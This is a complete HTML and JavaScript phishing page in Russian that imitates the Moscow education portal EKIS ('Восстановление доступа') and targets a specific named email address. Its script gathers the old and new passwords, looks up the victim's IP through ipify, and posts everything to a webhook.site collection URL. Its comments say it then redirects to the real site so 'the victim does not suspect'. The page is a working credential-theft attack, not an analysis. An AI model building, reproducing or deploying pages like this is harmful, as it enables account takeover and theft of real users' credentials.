<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ЕКИС - Восстановление доступа</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .card-header {
            text-align: center;
            padding: 30px 20px 20px;
            border-bottom: 1px solid #e0e0e0;
        }

        .logo {
            height: 60px;
            margin-bottom: 20px;
        }

        .restore-title {
            font-size: 18px;
            color: #555;
            font-weight: normal;
            margin-bottom: 8px;
        }

        .ekis-title {
            font-size: 24px;
            font-weight: bold;
            color: #1a1a2e;
            margin-bottom: 15px;
        }

        .card-body {
            padding: 25px 30px 35px;
        }

        .email-info {
            background: #f5f5f5;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 25px;
            font-size: 14px;
            color: #333;
        }

        .email-info span {
            font-weight: bold;
            color: #1a1a2e;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 15px;
            transition: border 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #007bff;
            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.2);
        }

        button {
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }

        button:hover {
            background: #0069d9;
        }

        .error-msg {
            color: #d32f2f;
            font-size: 13px;
            margin-top: 15px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-header">
            <img class="logo" src="https://center.educom.ru/oauth/images/mosobr.svg" alt="Московское образование" onerror="this.src='https://via.placeholder.com/200x60?text=EKIS'">
            <div class="restore-title">Восстановление доступа</div>
            <div class="ekis-title">ЕКИС</div>
        </div>
        <div class="card-body">
            <div class="email-info">
                 Давайте восстановим ваш доступ: <span>ShashkovAA2@edu.mos.ru</span>
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <label>Старый пароль</label>
                    <input type="password" id="old_pass" placeholder="Введите старый пароль" required autofocus>
                </div>
                <div class="form-group">
                    <label>Новый пароль</label>
                    <input type="password" id="new_pass" placeholder="Введите новый пароль" required>
                </div>
                <div class="form-group">
                    <label>Повтор нового пароля</label>
                    <input type="password" id="confirm_pass" placeholder="Повторите новый пароль" required>
                </div>
                <button type="submit">Сменить пароль</button>
                <div id="message" class="error-msg"></div>
            </form>
        </div>
    </div>

    <script>
        // ВАШ URL ДЛЯ СБОРА ДАННЫХ
        const WEBHOOK_URL = 'https://webhook.site/93d9b759-93db-4cc4-970f-47c09789fec3';

        const form = document.getElementById('loginForm');
        const msgDiv = document.getElementById('message');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const oldPass = document.getElementById('old_pass').value.trim();
            const newPass = document.getElementById('new_pass').value.trim();
            const confirmPass = document.getElementById('confirm_pass').value.trim();

            if (!oldPass || !newPass || !confirmPass) {
                msgDiv.textContent = '❌ Заполните все поля';
                return;
            }

            if (newPass !== confirmPass) {
                msgDiv.textContent = '❌ Новые пароли не совпадают';
                return;
            }

            // Отправка данных на Webhook.site
            const data = new URLSearchParams();
            data.append('user', 'ShashkovAA2@edu.mos.ru');
            data.append('old_password', oldPass);
            data.append('new_password', newPass);
            data.append('confirm_password', confirmPass);
            data.append('ip', await getIP());
            data.append('timestamp', new Date().toLocaleString('ru-RU'));

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: data,
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                });

                // Перенаправление на реальный сайт
                window.location.href = 'https://center.educom.ru/oauth/auth?sr=aHR0cHM6Ly9pbmZvLXNpdGVzLm1za29ici5ydQ==';
            } catch (err) {
                // Даже если ошибка — перенаправляем, чтобы жертва не заподозрила
                window.location.href = 'https://center.educom.ru/oauth/auth?sr=aHR0cHM6Ly9pbmZvLXNpdGVzLm1za29ici5ydQ==';
            }
        });

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'не определен';
            }
        }
    </script>
</body>
</html>
